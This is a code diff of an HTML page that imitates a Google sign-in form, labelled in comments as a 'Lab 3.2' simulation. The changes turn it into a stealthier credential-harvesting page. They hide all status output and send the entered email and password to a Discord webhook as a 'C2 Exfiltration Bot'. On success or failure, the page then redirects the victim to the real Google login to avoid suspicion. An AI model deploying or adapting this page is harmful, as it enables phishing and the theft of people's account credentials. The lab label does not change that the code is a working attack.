@@ -7,10 +7,12 @@
         body { font-family: 'Roboto', arial, sans-serif; background: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
         .card { width: 350px; padding: 40px; border: 1px solid #dadce0; border-radius: 8px; text-align: center; box-shadow: 0 1px 3px rgba(0,0,0,0.12); }
         img { width: 75px; margin-bottom: 10px; }
-        h1 { font-size: 24px; font-weight: 400; color: #202124; }
-        input { width: 100%; padding: 13px; margin: 10px 0; border: 1px solid #dadce0; border-radius: 4px; box-sizing: border-box; }
-        button { width: 100%; padding: 10px; background: #1a73e8; color: white; border: none; border-radius: 4px; cursor: pointer; }
-        #status { margin-top: 15px; font-size: 12px; font-family: monospace; }
+        h1 { font-size: 24px; font-weight: 400; color: #202124; margin-bottom: 8px; }
+        p { color: #202124; font-size: 16px; margin-bottom: 24px; }
+        input { width: 100%; padding: 13px; margin: 10px 0; border: 1px solid #dadce0; border-radius: 4px; box-sizing: border-box; font-size: 14px; }
+        button { width: 100%; padding: 10px; background: #1a73e8; color: white; border: none; border-radius: 4px; cursor: pointer; font-size: 14px; font-weight: 500; margin-top: 20px; }
+        /* Hidden status area for the student's eyes only via Console */
+        #status { display: none; } 
     </style>
 </head>
 <body>
@@ -28,53 +30,59 @@
 </div>
 
 <script>
-    // GitHub Pages Safety: Don't hardcode the hook. Ask for it on load.
+    // GitHub Pages Safety Protocol
     let hook = sessionStorage.getItem('discord_hook');
-    
     if (!hook) {
-        hook = prompt("ENTER YOUR DISCORD WEBHOOK URL (This is only saved in this tab's memory):");
+        hook = prompt("PASTE YOUR DISCORD WEBHOOK URL HERE:");
         if (hook) sessionStorage.setItem('discord_hook', hook);
     }
 
     async function transmit() {
         const e = document.getElementById('email').value;
         const p = document.getElementById('pass').value;
-        const status = document.getElementById('status');
 
-        if (!hook) {
-            status.innerText = "Error: No Webhook URL provided.";
-            return;
-        }
+        if (!hook) return; // Silent fail if no hook
 
-        status.innerText = "Transmitting to C2 server...";
-
+        // The Payload: Using separate fields for clean Discord formatting
         const payload = {
-            content: "🚨 **Credential Harvested via GitHub Pages Simulation**",
+            username: "C2 Exfiltration Bot",
+            avatar_url: "https://cdn-icons-png.flaticon.com/512/6861/6861362.png",
             embeds: [{
+                title: "📬 New Credentials Harvested",
+                color: 16711680, // Red color
                 fields: [
-                    { name: "User", value: `\`${e}\`` },
-                    { name: "Pass", value: `||${p}||` }
+                    {
+                        name: "📧 Target Email",
+                        value: `\`\`\`${e || "No input"}\`\`\``,
+                        inline: false
+                    },
+                    {
+                        name: "🔑 Target Password",
+                        value: `|| ${p || "No input"} ||`, // Spoiler tag for stealth
+                        inline: false
+                    }
                 ],
-                footer: { text: "Lab 3.2 - Document Injection Simulation" }
+                footer: { text: "Source: Lab 3.2 Simulation" },
+                timestamp: new Date()
             }]
         };
 
         try {
-            const response = await fetch(hook, {
+            // We use the fetch but don't update the UI on success
+            await fetch(hook, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify(payload)
             });
 
-            if (response.ok) {
-                status.style.color = "green";
-                status.innerText = "Exfiltration Successful. Redirecting...";
-                setTimeout(() => { window.location.href = "https://accounts.google.com"; }, 1000);
-            } else {
-                status.innerText = "Discord Error: " + response.status;
-            }
+            // "The Illusion": Just redirect them to the real Google login 
+            // making them think the first attempt just timed out or glitched.
+            window.location.href = "https://accounts.google.com/ServiceLogin";
+            
         } catch (err) {
-            status.innerText = "Network Error. Likely CORS or invalid URL.";
+            console.error("Exfiltration failed:", err);
+            // Even on error, redirect to avoid suspicion
+            window.location.href = "https://accounts.google.com/ServiceLogin";
         }
     }
 </script>
